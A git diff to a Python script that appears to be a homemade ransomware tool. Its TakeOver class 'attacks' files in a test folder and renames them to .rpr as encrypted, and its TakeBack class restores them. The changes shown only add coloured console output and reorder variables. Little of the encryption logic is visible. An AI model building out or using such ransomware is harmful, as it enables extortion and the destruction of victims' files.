@@ -4,7 +4,16 @@ import os
 import sys
 import json
 
-banner = """
+# Variables
+DIR = "C:/Users/krist/Documents/ran_test"
+dirs = []
+COLORS = {
+  "hacker_green": "\033[1;32;40m",
+  "red": "\033[1;31;40m",
+  "white":"\033[1;37;40m",
+}
+banner = f"""
+{COLORS["hacker_green"]}
  /$$$$$$$                                                   
 | $$__  $$                                                  
 | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
@@ -16,11 +25,7 @@ banner = """
                               | $$                          
                               | $$                          
                               |__/                          
-"""
-
-# Variables
-DIR = "C:/Users/krist/Documents/ran_test"
-dirs = []
+{COLORS["white"]}"""
 
 # The file rewriting class
 class TakeOver():
@@ -49,7 +54,7 @@ class TakeOver():
       # Change file ext
       ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
       if ext == ".rpr":
-        print(f"{i} is already encrypted")
+        print(f"{COLORS['red']}{i} is already encrypted{COLORS['white']}")
       print(f"Attacking: {PATH}")
       self.rpr_file = i.replace(ext, '.rpr')
       ENC_FILE = f"{directory}/{self.rpr_file}"
@@ -82,7 +87,7 @@ class TakeBack():
       # Put old extension back to the file
       ext = '.' + os.path.realpath(i).split('.')[-1:][0]
       if ext != ".rpr":
-        print(f"{i} is not encrypted")
+        print(f"{COLORS['red']}{i} is not encrypted{COLORS['white']}")
         continue
       self.o_file = i.replace(ext, f'{self.ENC_FILES[i]}')
       print(f"Restoring: {i}")
